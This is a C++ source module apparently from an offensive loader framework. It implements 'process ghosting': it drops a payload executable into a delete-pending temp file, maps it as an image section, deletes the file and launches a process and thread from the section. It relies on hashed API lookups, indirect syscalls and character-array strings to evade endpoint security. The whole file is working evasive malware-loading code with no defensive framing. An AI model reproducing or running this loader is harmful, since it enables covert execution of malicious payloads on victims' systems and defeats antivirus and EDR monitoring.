#include "Modules/ghost.h"
#include "Core/api_resolve.h"
#include "Core/syscalls.h"
#include "Utils/helpers.h"
#include <cstddef>

//Syscall hashes (Nt* functions)
#define HASH_NtCreateFile              0x18A7B1B2FB2E2AFBULL
#define HASH_NtWriteFile               0x8C6245C2AEFC20D2ULL
#define HASH_NtSetInformationFile      0xF74FD0B30EFD1299ULL
#define HASH_NtCreateSection           0x0CB836324AC72AF0ULL
#define HASH_NtClose                   0x4F3163BAF74EFD5DULL
#define HASH_NtCreateProcessEx         0x1B9E889E2EED37D7ULL
#define HASH_NtQueryInformationProcess 0x1EEA5D4868B92E82ULL
#define HASH_NtReadVirtualMemory       0xEB7E1C5F98917D03ULL
#define HASH_NtWriteVirtualMemory      0x3F92AD30366805B2ULL
#define HASH_NtAllocateVirtualMemory   0x0E7C8C07D724ED6CULL
#define HASH_NtCreateThreadEx          0xA3BEFC8698C66F50ULL

//Rtl* function hashes (resolved via GetProcAddressByHash) -----
#define HASH_RtlCreateProcessParametersEx 0xFD9CFECB2E93AADBULL
#define HASH_RtlDestroyProcessParameters  0x662F3246B36FF634ULL
#define HASH_NTDLL                        0xE1193D187E7EA30DULL

//NT constants
#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

#define GHOST_RTL_USER_PROC_PARAMS_NORMALIZED 0x01

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif

#ifndef FILE_SUPERSEDE
#define FILE_SUPERSEDE 0x00000000
#endif

#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif

#define GHOST_FileDispositionInformation 13

#define GHOST_PEB_IMAGEBASE_OFFSET       0x10
#define GHOST_PEB_PROCESSPARAMS_OFFSET   0x20

// ----- Structures -----

typedef struct _GHOST_FILE_DISP_INFO {
    BOOLEAN DeleteFile;
} GHOST_FILE_DISP_INFO;

typedef struct _GHOST_CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} GHOST_CURDIR;

typedef struct _GHOST_PROCESS_PARAMS {
    ULONG           MaximumLength;
    ULONG           Length;
    ULONG           Flags;
    ULONG           DebugFlags;
    HANDLE          ConsoleHandle;
    ULONG           ConsoleFlags;
    HANDLE          StandardInput;
    HANDLE          StandardOutput;
    HANDLE          StandardError;
    GHOST_CURDIR    CurrentDirectory;
    UNICODE_STRING  DllPath;
    UNICODE_STRING  ImagePathName;
    UNICODE_STRING  CommandLine;
    PVOID           Environment;        // 0x80 on x64
} GHOST_PROCESS_PARAMS, *PGHOST_PROCESS_PARAMS;

// Verify layout
static_assert(offsetof(GHOST_PROCESS_PARAMS, Environment) == 0x80,
    "GHOST_PROCESS_PARAMS::Environment offset mismatch");

//Rtl function typedefs
typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
    PGHOST_PROCESS_PARAMS*, PUNICODE_STRING, PUNICODE_STRING,
    PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING,
    PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG
);

typedef NTSTATUS(NTAPI* fnRtlDestroyProcessParameters)(
    PGHOST_PROCESS_PARAMS
);

//Inline syscall helper 
// Wraps the 3-step pattern into a clean call
static inline NTSTATUS SyscallNt(QWORD hash,
    ULONG_PTR a1 = 0, ULONG_PTR a2 = 0, ULONG_PTR a3 = 0,
    ULONG_PTR a4 = 0, ULONG_PTR a5 = 0, ULONG_PTR a6 = 0,
    ULONG_PTR a7 = 0, ULONG_PTR a8 = 0, ULONG_PTR a9 = 0,
    ULONG_PTR a10 = 0, ULONG_PTR a11 = 0)
{
    SYSCALL_GATE gate = GetSSNByHash(hash);
    if (!gate.pSyscallAddr) return STATUS_UNSUCCESSFUL;
    PREPARE_SYSCALL(gate);
    return IndirectSyscall(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

// =====================================================================
// GhostExecute
// =====================================================================
NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {

    //Validate PE
    if (!payloadBuffer || payloadSize < sizeof(IMAGE_DOS_HEADER))
        return STATUS_UNSUCCESSFUL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payloadBuffer;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return STATUS_UNSUCCESSFUL;

    if (payloadSize < (SIZE_T)(pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
        return STATUS_UNSUCCESSFUL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)payloadBuffer + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return STATUS_UNSUCCESSFUL;

    //Resolve Rtl functions from ntdll via hash 
    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return STATUS_UNSUCCESSFUL;

    fnRtlCreateProcessParametersEx pRtlCreateProcessParametersEx =
        (fnRtlCreateProcessParametersEx)GetProcAddressByHash(hNtdll, HASH_RtlCreateProcessParametersEx);
    fnRtlDestroyProcessParameters pRtlDestroyProcessParameters =
        (fnRtlDestroyProcessParameters)GetProcAddressByHash(hNtdll, HASH_RtlDestroyProcessParameters);

    if (!pRtlCreateProcessParametersEx || !pRtlDestroyProcessParameters)
        return STATUS_UNSUCCESSFUL;

    //Get API table for Win32 helpers
    API_TABLE& API = GetAPI();

    //Build temp file path 
    // env var name: TEMP
    wchar_t envTemp[] = { 'T','E','M','P','\0' };
    wchar_t tempDir[MAX_PATH] = { 0 };
    API.GetEnvironmentVariableW(envTemp, tempDir, MAX_PATH);

    // ghost filename: "ghost.exe"
    wchar_t ghostName[] = { 'g','h','o','s','t','.','e','x','e','\0' };

    //NT prefix
    wchar_t ntPrefix[] = { '\\','?','?','\\','\0' };

    // Build NT path: \??\C:\...\Temp\ghost.exe
    wchar_t ntFilePath[MAX_PATH * 2] = { 0 };
    wcscat_s(ntFilePath, MAX_PATH * 2, ntPrefix);
    wcscat_s(ntFilePath, MAX_PATH * 2, tempDir);
    // ensure trailing backslash
    SIZE_T pathLen = wcslen(ntFilePath);
    if (pathLen > 0 && ntFilePath[pathLen - 1] != L'\\') {
        ntFilePath[pathLen] = L'\\';
        ntFilePath[pathLen + 1] = L'\0';
    }
    wcscat_s(ntFilePath, MAX_PATH * 2, ghostName);

    // Build DOS path (strip \??\ prefix) for process parameters
    wchar_t* dosPath = ntFilePath + 4;  // skip "\??\"

    // --- Handle tracking ---
    HANDLE hFile    = NULL;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;
    NTSTATUS status;

    // PHASE 1: FILE OBJECT (I/O Manager)
    // NtCreateFile -> NtSetInformationFile(DeletePending) -> NtWriteFile

    UNICODE_STRING uPath;
    mRtlInitUnicodeString(&uPath, ntFilePath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb = { 0 };

    // NtCreateFile
    status = SyscallNt(HASH_NtCreateFile,
        (ULONG_PTR)&hFile,
        (ULONG_PTR)(DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE),
        (ULONG_PTR)&oa,
        (ULONG_PTR)&iosb,
        (ULONG_PTR)NULL,                        // AllocationSize
        (ULONG_PTR)FILE_ATTRIBUTE_NORMAL,
        (ULONG_PTR)0,                            // ShareAccess
        (ULONG_PTR)FILE_SUPERSEDE,
        (ULONG_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
        (ULONG_PTR)NULL,                         // EaBuffer
        (ULONG_PTR)0                             // EaLength
    );
    if (status != 0) goto cleanup;

    // NtSetInformationFile — mark delete-pending BEFORE write
    {
        GHOST_FILE_DISP_INFO fdi;
        fdi.DeleteFile = TRUE;
        iosb = { 0 };

        status = SyscallNt(HASH_NtSetInformationFile,
            (ULONG_PTR)hFile,
            (ULONG_PTR)&iosb,
            (ULONG_PTR)&fdi,
            (ULONG_PTR)sizeof(fdi),
            (ULONG_PTR)GHOST_FileDispositionInformation
        );
        if (status != 0) goto cleanup;
    }

    // NtWriteFile — write PE payload
    {
        LARGE_INTEGER offset = { 0 };
        iosb = { 0 };

        status = SyscallNt(HASH_NtWriteFile,
            (ULONG_PTR)hFile,
            (ULONG_PTR)NULL,            // Event
            (ULONG_PTR)NULL,            // ApcRoutine
            (ULONG_PTR)NULL,            // ApcContext
            (ULONG_PTR)&iosb,
            (ULONG_PTR)payloadBuffer,
            (ULONG_PTR)payloadSize,
            (ULONG_PTR)&offset,
            (ULONG_PTR)NULL             // Key
        );
        if (status != 0) goto cleanup;
    }

    // PHASE 2: SECTION OBJECT (Memory Manager)
    // NtCreateSection with SEC_IMAGE

    status = SyscallNt(HASH_NtCreateSection,
        (ULONG_PTR)&hSection,
        (ULONG_PTR)SECTION_ALL_ACCESS,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,                // MaximumSize = file size
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)SEC_IMAGE,
        (ULONG_PTR)hFile
    );
    if (status != 0) goto cleanup;

    // =========================================================
    // PHASE 3: DECOUPLING
    // Close file handle -> file deleted, section survives
    // =========================================================

    SyscallNt(HASH_NtClose, (ULONG_PTR)hFile);
    hFile = NULL;

    // PHASE 4: PROCESS CREATION (Process Manager)
    // NtCreateProcessEx with SectionHandle

    status = SyscallNt(HASH_NtCreateProcessEx,
        (ULONG_PTR)&hProcess,
        (ULONG_PTR)PROCESS_ALL_ACCESS,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NtCurrentProcess(),
        (ULONG_PTR)0,                   // Flags
        (ULONG_PTR)hSection,
        (ULONG_PTR)NULL,                // DebugPort
        (ULONG_PTR)NULL,                // Token
        (ULONG_PTR)0                    // Reserved
    );
    if (status != 0) goto cleanup;

    // PHASE 5: OS LOADER SIMULATION
    // PEB -> ImageBase -> EntryPoint -> Params -> Thread

    {
        //Query PEB address
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG retLen = 0;

        status = SyscallNt(HASH_NtQueryInformationProcess,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)0,               // ProcessBasicInformation
            (ULONG_PTR)&pbi,
            (ULONG_PTR)sizeof(pbi),
            (ULONG_PTR)&retLen
        );
        if (status != 0) goto cleanup;

        PPEB remotePeb = pbi.PebBaseAddress;

        //Read ImageBaseAddress from PEB
        PVOID imageBase = NULL;
        SIZE_T bytesRead = 0;

        status = SyscallNt(HASH_NtReadVirtualMemory,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)((PBYTE)remotePeb + GHOST_PEB_IMAGEBASE_OFFSET),
            (ULONG_PTR)&imageBase,
            (ULONG_PTR)sizeof(PVOID),
            (ULONG_PTR)&bytesRead
        );
        if (status != 0) goto cleanup;

        //Read PE headers from remote process -> find EntryPoint
        BYTE headerBuf[0x1000];

        status = SyscallNt(HASH_NtReadVirtualMemory,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)imageBase,
            (ULONG_PTR)headerBuf,
            (ULONG_PTR)sizeof(headerBuf),
            (ULONG_PTR)&bytesRead
        );
        if (status != 0) goto cleanup;

        PIMAGE_DOS_HEADER rDos = (PIMAGE_DOS_HEADER)headerBuf;
        if (rDos->e_magic != IMAGE_DOS_SIGNATURE) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

        PIMAGE_NT_HEADERS rNt = (PIMAGE_NT_HEADERS)(headerBuf + rDos->e_lfanew);
        if (rNt->Signature != IMAGE_NT_SIGNATURE) { status = STATUS_UNSUCCESSFUL; goto cleanup; }

        PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + rNt->OptionalHeader.AddressOfEntryPoint);

        //Create process parameters
        UNICODE_STRING uImagePath, uDllPath, uCurrentDir, uCmdLine, uTitle;

        mRtlInitUnicodeString(&uImagePath, dosPath);

        wchar_t sysDir[MAX_PATH] = { 0 };
        API.GetSystemDirectoryW(sysDir, MAX_PATH);
        mRtlInitUnicodeString(&uDllPath, sysDir);

        // Use system dir as current dir
        mRtlInitUnicodeString(&uCurrentDir, sysDir);
        mRtlInitUnicodeString(&uCmdLine, dosPath);

        wchar_t titleStr[] = { 'G','\0' };
        mRtlInitUnicodeString(&uTitle, titleStr);

        PGHOST_PROCESS_PARAMS processParams = NULL;
        status = pRtlCreateProcessParametersEx(
            &processParams,
            &uImagePath,
            &uDllPath,
            &uCurrentDir,
            &uCmdLine,
            NULL,           // Environment (inherit)
            &uTitle,
            NULL, NULL, NULL,
            GHOST_RTL_USER_PROC_PARAMS_NORMALIZED
        );
        if (status != 0) goto cleanup;

        //Write params to remote process at SAME virtual address
        SIZE_T pageOffset = (ULONG_PTR)processParams & 0xFFF;
        PVOID remoteAllocBase = processParams;
        SIZE_T remoteAllocSize = (SIZE_T)processParams->MaximumLength + pageOffset;

        status = SyscallNt(HASH_NtAllocateVirtualMemory,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)&remoteAllocBase,
            (ULONG_PTR)0,
            (ULONG_PTR)&remoteAllocSize,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
            (ULONG_PTR)PAGE_READWRITE
        );
        if (status != 0) {
            pRtlDestroyProcessParameters(processParams);
            goto cleanup;
        }

        // Write param data at exact address
        status = SyscallNt(HASH_NtWriteVirtualMemory,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)processParams,
            (ULONG_PTR)processParams,
            (ULONG_PTR)processParams->MaximumLength,
            (ULONG_PTR)NULL
        );
        if (status != 0) {
            pRtlDestroyProcessParameters(processParams);
            goto cleanup;
        }

        // Handle environment block if outside params allocation
        if (processParams->Environment) {
            ULONG_PTR envOffset =
                (ULONG_PTR)processParams->Environment - (ULONG_PTR)processParams;

            if (envOffset >= processParams->MaximumLength) {
                PVOID envLocal = processParams->Environment;

                // Calculate env size 
                PWCHAR pEnv = (PWCHAR)envLocal;
                SIZE_T idx = 0;
                while (pEnv[idx] != L'\0') {
                    idx += wcslen(&pEnv[idx]) + 1;
                }
                idx++;
                SIZE_T envBytes = idx * sizeof(WCHAR);

                SIZE_T envPageOff = (ULONG_PTR)envLocal & 0xFFF;
                PVOID remoteEnvBase = envLocal;
                SIZE_T remoteEnvSize = envBytes + envPageOff;

                NTSTATUS envStatus = SyscallNt(HASH_NtAllocateVirtualMemory,
                    (ULONG_PTR)hProcess,
                    (ULONG_PTR)&remoteEnvBase,
                    (ULONG_PTR)0,
                    (ULONG_PTR)&remoteEnvSize,
                    (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
                    (ULONG_PTR)PAGE_READWRITE
                );
                if (envStatus == 0) {
                    SyscallNt(HASH_NtWriteVirtualMemory,
                        (ULONG_PTR)hProcess,
                        (ULONG_PTR)envLocal,
                        (ULONG_PTR)envLocal,
                        (ULONG_PTR)envBytes,
                        (ULONG_PTR)NULL
                    );
                }
            }
        }

        // Update PEB->ProcessParameters
        PVOID remoteParamsAddr = processParams;
        SyscallNt(HASH_NtWriteVirtualMemory,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)((PBYTE)remotePeb + GHOST_PEB_PROCESSPARAMS_OFFSET),
            (ULONG_PTR)&remoteParamsAddr,
            (ULONG_PTR)sizeof(PVOID),
            (ULONG_PTR)NULL
        );

        pRtlDestroyProcessParameters(processParams);

        // 5f: Create initial thread at entry point
        status = SyscallNt(HASH_NtCreateThreadEx,
            (ULONG_PTR)&hThread,
            (ULONG_PTR)THREAD_ALL_ACCESS,
            (ULONG_PTR)NULL,
            (ULONG_PTR)hProcess,
            (ULONG_PTR)entryPoint,
            (ULONG_PTR)NULL,         // Argument
            (ULONG_PTR)0,            // Flags
            (ULONG_PTR)0,            // ZeroBits
            (ULONG_PTR)0,            // StackSize
            (ULONG_PTR)0,            // MaxStackSize
            (ULONG_PTR)NULL          // AttributeList
        );
    }

cleanup:
    if (hThread)  { SyscallNt(HASH_NtClose, (ULONG_PTR)hThread);  hThread  = NULL; }
    if (hProcess) { SyscallNt(HASH_NtClose, (ULONG_PTR)hProcess); hProcess = NULL; }
    if (hSection) { SyscallNt(HASH_NtClose, (ULONG_PTR)hSection); hSection = NULL; }
    if (hFile)    { SyscallNt(HASH_NtClose, (ULONG_PTR)hFile);    hFile    = NULL; }

    return status;
}
